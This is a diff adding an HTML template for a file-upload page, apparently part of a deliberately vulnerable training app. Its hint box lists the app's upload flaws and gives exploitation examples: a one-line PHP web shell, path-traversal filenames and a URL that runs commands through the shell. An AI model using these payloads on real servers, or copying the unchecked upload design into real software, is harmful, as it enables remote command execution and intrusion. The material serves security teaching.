@@ -1,0 +1,37 @@
+{% extends "base.html" %}
+
+{% block title %}Upload File{% endblock %}
+
+{% block content %}
+<div class="form-container">
+    <h2>Upload Profile Picture</h2>
+    
+    <form method="POST" action="/upload" enctype="multipart/form-data">
+        <div class="form-group">
+            <label for="file">Choose file:</label>
+            <input type="file" id="file" name="file" required>
+        </div>
+        
+        <button type="submit" class="btn">Upload</button>
+    </form>
+    
+    <div class="hint-box">
+        <h4>🔥 File Upload Vulnerabilities:</h4>
+        <ul>
+            <li><strong>No file type validation</strong> - Upload PHP, JSP, Python files!</li>
+            <li><strong>No filename sanitization</strong> - Try: <code>../../../evil.php</code></li>
+            <li><strong>Directory Traversal</strong> - Access any file on server</li>
+        </ul>
+        
+        <h4>Exploitation Examples:</h4>
+        <p><strong>1. Upload a malicious file:</strong></p>
+        <p>Create <code>shell.php</code> with content: <code>&lt;?php system($_GET['cmd']); ?&gt;</code></p>
+        
+        <p><strong>2. Path Traversal:</strong></p>
+        <p>Upload with filename: <code>../../../app/templates/hacked.html</code></p>
+        
+        <p><strong>3. Access uploaded file:</strong></p>
+        <p><code>http://localhost:5000/uploads/shell.php?cmd=ls</code></p>
+    </div>
+</div>
+{% endblock %}
